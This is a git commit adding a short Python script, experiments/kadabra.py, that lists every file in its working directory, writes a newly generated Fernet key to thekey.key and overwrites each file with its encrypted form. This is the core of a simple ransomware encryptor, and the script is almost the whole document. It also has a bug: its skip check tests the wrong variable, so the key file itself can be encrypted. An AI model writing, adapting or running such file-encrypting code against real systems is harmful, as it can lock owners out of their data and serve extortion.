f5ba638d195ae9b2c480c2fae02849dc3b647740
Justin Avina <jt.avina@icloud.com>
2022-05-16 14:19:27 -0700

    added a new experimental folder with decrypt.py and a encrypt file

---
+++ experiments/kadabra.py
@@ -0,0 +1,25 @@
+import os
+from cryptography.fernet import Fernet
+
+files = []
+
+for file in os.listdir():
+    if file == "kadabra.py" or files == "thekey.key" or file == "decrypt.py":
+        continue
+    if os.path.isfile(file):
+        files.append(file)
+
+print(files)
+
+key = Fernet.generate_key()
+print(key)
+
+with open("thekey.key", "wb") as thekey:
+    thekey.write(key)
+
+for file in files:
+    with open(file, "rb") as thefile:
+        contents = thefile.read()
+    contents_encrypted = Fernet(key).encrypt(contents)
+    with open(file, "wb") as thefile:
+        thefile.write(contents_encrypted)
